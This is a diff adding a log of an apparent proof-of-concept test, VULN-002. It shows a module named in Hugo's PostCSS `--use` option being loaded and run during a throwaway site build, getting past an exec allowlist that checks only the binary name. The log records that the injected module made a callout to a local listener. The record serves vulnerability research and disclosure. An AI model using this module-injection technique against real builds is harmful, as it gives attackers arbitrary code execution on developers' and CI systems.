@@ -1,0 +1,13 @@
+==============================================================================
+VULN-002: Node code exec via resources.PostCSS `--use` module injection
+target: throwaway `hugo` build (postcss installed into the site)
+[INFO] postcss.go forwards --use verbatim; postcss-cli require()s+runs it (exec allowlist checks only the name)
+==============================================================================
+[SETUP] OOB listener on 127.0.0.1:41323; evil.js phones home to /postcss-rce-6bd71b5d when require()d
+[SETUP] npm install postcss postcss-cli into the site (theme's build dependency)
+[INFO] postcss + postcss-cli installed
+[STEP] running the build; resources.PostCSS should require()+run ./evil.js
+[INFO] build rc=0; OOB callouts to /postcss-rce-6bd71b5d: 1
+[PROOF] injected Node plugin executed and phoned home (1 callout to /postcss-rce-6bd71b5d)
+[OK] exploit confirmed — a module named only via the PostCSS `use` option was require()d and executed during the build, making a network request to our listener. Arbitrary Node code execution past the exec allowlist (which only vetted the binary name).
+==> VULN-002: CONFIRMED — Node code exec via PostCSS --use module injection
